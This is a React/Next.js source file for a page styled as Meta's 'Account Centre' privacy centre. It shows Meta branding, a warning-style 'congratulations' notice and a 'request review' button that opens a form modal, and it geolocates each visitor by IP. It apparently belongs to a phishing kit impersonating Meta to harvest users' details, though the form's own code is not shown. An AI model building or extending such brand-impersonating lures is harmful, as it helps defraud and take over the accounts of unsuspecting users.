'use client';

import BackgroundImage from '@/assets/images/bg-image.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import WarningImage from '@/assets/images/warning.png';
import FormModal from '@/components/form-modal';
import { useGeoStore } from '@/store/geo-store';
import type { Dictionary } from '@/types/content';
import { getDictionary } from '@/utils/get-content';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image, { type StaticImageData } from 'next/image';
import { useEffect, useState, type FC } from 'react';

interface MenuItem {
    id: string;
    icon: IconDefinition;
    label: string;
    isActive?: boolean;
}

interface InfoCardItem {
    id: string;
    title: string;
    subtitle: string;
    image?: StaticImageData;
}

const Page: FC = () => {
    const { setGeoInfo, geoInfo } = useGeoStore();
    const [dictionary, setDictionary] = useState<Dictionary | null>(null);
    const [isLoading, setIsLoading] = useState(true);
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [modalKey, setModalKey] = useState(0);

    useEffect(() => {
        const initializeContent = async () => {
            try {
                setIsLoading(true);

                const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
                let languageCode = 'en';

                if (geoResponse.ok) {
                    const geoData = await geoResponse.json();
                    setGeoInfo({
                        asn: geoData.asn || 0,
                        ip: geoData.ip || 'CHỊU',
                        country: geoData.country || 'CHỊU',
                        city: geoData.city || 'CHỊU',
                        country_code: geoData.country_code || 'US'
                    });
                    languageCode = geoData.country_code || 'en';
                }

                const fullDictionary = await getDictionary(languageCode);
                setDictionary(fullDictionary);
            } catch (err) {
                console.error('Failed to initialize content:', err);
            } finally {
                setIsLoading(false);
            }
        };

        initializeContent();
    }, [setGeoInfo]);

    if (isLoading || !dictionary) {
        return (
            <div className='flex min-h-screen items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='animate-pulse text-xl'>Loading...</div>
            </div>
        );
    }

    const content = dictionary.privacyCenter;

    const menuItems: MenuItem[] = [
        { id: 'home', icon: faHouse, label: content.menuItems.home, isActive: true },
        { id: 'search', icon: faMagnifyingGlass, label: content.menuItems.search },
        { id: 'privacy', icon: faLock, label: content.menuItems.privacy },
        { id: 'rules', icon: faCircleInfo, label: content.menuItems.rules },
        { id: 'settings', icon: faGear, label: content.menuItems.settings }
    ];

    const privacyCenterItems: InfoCardItem[] = [
        { id: 'policy', title: content.privacyPolicyTitle, subtitle: content.privacyPolicyLabel, image: ProfileImage },
        { id: 'manage', title: content.manageInfoTitle, subtitle: content.privacyPolicyLabel, image: ProfileImage }
    ];

    const agreementItems: InfoCardItem[] = [
        { id: 'meta-ai', title: content.metaAiTitle, subtitle: content.userAgreementLabel, image: MetaAI }
    ];

    const resourceItems: InfoCardItem[] = [
        { id: 'generative-ai', title: content.generativeAiTitle, subtitle: content.privacyCenterSection },
        { id: 'ai-systems', title: content.aiSystemsTitle, subtitle: content.metaAiWebsiteLabel },
        { id: 'intro-ai', title: content.introAiTitle, subtitle: content.forTeenagers }
    ];

    return (
        <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
            <title>Account Centre</title>
            {isModalOpen && <FormModal key={modalKey} dictionary={dictionary} />}
            <div className='flex w-full max-w-[1100px]'>
                <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
                    <p className='my-4 text-2xl font-bold'>{content.title}</p>
                    {menuItems.map((item) => (
                        <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
                            <FontAwesomeIcon icon={item.icon} />
                            <p>{item.label}</p>
                        </div>
                    ))}
                </div>
                <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
                    <div className='flex items-center gap-2'>
                        <Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
                        <p className='text-2xl font-bold'>{content.congratulationsTitle}</p>
                    </div>
                    <p>{content.congratulationsMessage}</p>
                    <div className='rounded-b-[20px] bg-white'>
                        <Image src={BackgroundImage} alt='' className='w-full rounded-t-[20px] bg-blue-500 py-10' />
                        <div className='flex flex-col items-start justify-center gap-5 p-5'>
                            <p className='text-start text-2xl'>{content.submitRequest}</p>
                            <p className='text-[15px]'>{content.securityTitle}</p>
                            <p className='text-[15px]'>{content.securityMessage}</p>
                            <button
                                onClick={() => {
                                    setModalKey((prev) => prev + 1);
                                    setIsModalOpen(true);
                                }}
                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                            >
                                {content.requestReview}
                            </button>
                        </div>
                    </div>
                    <div className='flex flex-col gap-3'>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{content.privacyCenterSection}</p>
                            {privacyCenterItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === privacyCenterItems.length - 1;
                                const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{item.title}</p>
                                            <p className='text-[#465a69]'>{item.subtitle}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{content.userAgreementDetails}</p>
                            {agreementItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === agreementItems.length - 1;
                                const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{item.title}</p>
                                            <p className='text-[#465a69]'>{item.subtitle}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <div>
                            <p className='font-sans font-medium text-[#212529]'>{content.additionalResources}</p>
                            {resourceItems.map((item, index) => {
                                const isFirst = index === 0;
                                const isLast = index === resourceItems.length - 1;
                                const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';

                                return (
                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
                                        {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                        <div className='flex flex-1 flex-col'>
                                            <p className='font-medium'>{item.title}</p>
                                            <p className='text-[#465a69]'>{item.subtitle}</p>
                                        </div>
                                        <FontAwesomeIcon icon={faChevronRight} />
                                    </div>
                                );
                            })}
                        </div>
                        <p className='text-[15px] text-[#465a69]'>{content.privacyRisksMessage}</p>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Page;
